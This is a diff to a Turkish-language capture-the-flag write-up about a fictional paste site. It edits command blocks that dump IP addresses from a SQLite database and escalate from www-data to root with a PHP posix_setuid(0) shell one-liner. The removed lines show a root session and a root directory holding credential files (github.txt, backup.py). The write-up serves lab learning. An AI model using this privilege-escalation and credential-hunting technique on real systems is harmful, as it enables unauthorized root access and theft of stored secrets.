@@ -115,23 +115,18 @@ Görevin; bu paylaşımdan sorumlu kişi ya da grupları tespit etmek, PasteZone
 
 Komutlar:
 ```
-pastezone.db ".TABLE"
-pastezone.db ".schema notes"
+sqlite3 pastezone.db ".TABLE"
 sqlite3 pastezone.db ".schema notes"
-CREATE TABLE notes (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    title TEXT NOT NULL,
-    content TEXT NOT NULL,
-    creator TEXT DEFAULT 'Anonymous',
-    views INTEGER DEFAULT 0,
-    rating INTEGER DEFAULT 0,
-    ip_address TEXT DEFAULT '0.0.0.0',
-    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
-);
+
 ```
 
 - DB içerisinde aradığımız IP adresinin tutulduğu yer burası.
 - `sqlite3 pastezone.db "select ip_address , id from notes"` komutu ile IP'leri buluyoruz ve flag tamamlanıyor.
+
+```
+sqlite3 pastezone.db "select ip_address , id from notes"
+
+```
 
 ### Flag 3 & Flag 4: PasteZone platform yöneticisinin GitHub hesabının "e-posta:parola" bilgileri nedir?
 
@@ -155,35 +150,13 @@ php8.4 -r "posix_setuid(0); system('/bin/bash');"
 
 
 ```
-www-data@debian:/var/www/html$ whoami
-whoami
-www-data
-www-data@debian:/var/www/html$ php8.4 -r "posix_setuid(0); system('/bin/bash');"
-< php8.4 -r "posix_setuid(0); system('/bin/bash');"
-pwd
-/var/www/html
-whoami
-root
+php8.4 -r "posix_setuid(0); system('/bin/bash');"
+
 ```
 
 - Bu noktadan sonra arama tarama başladı ve root dizininde bilgi aramaya başladık.
 
  ![Root dizini](images/image9.png?v=1)
-
-```
-cd root
-ls -la
-total 36
-drwx------  5 root root 4096 Aug 31  2025 .
-drwxr-xr-x 18 root root 4096 Dec 27  2024 ..
--rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
-drwxr-xr-x  5 root root 4096 Aug 26  2025 .cache
-drwxr-xr-x  3 root root 4096 Aug 26  2025 .config
-drwxr-xr-x  3 root root 4096 Dec 27  2024 .local
--rw-r--r--  1 root root  161 Jul  9  2019 .profile
--rw-r--r--  1 root root  921 Aug 31  2025 backup.py
--rw-r--r--  1 root root   39 Aug 31  2025 github.txt
-```
 
 - Ve buradaki github.txt 3. soruyu, backup.py 4. soruyu veriyor bize.
 
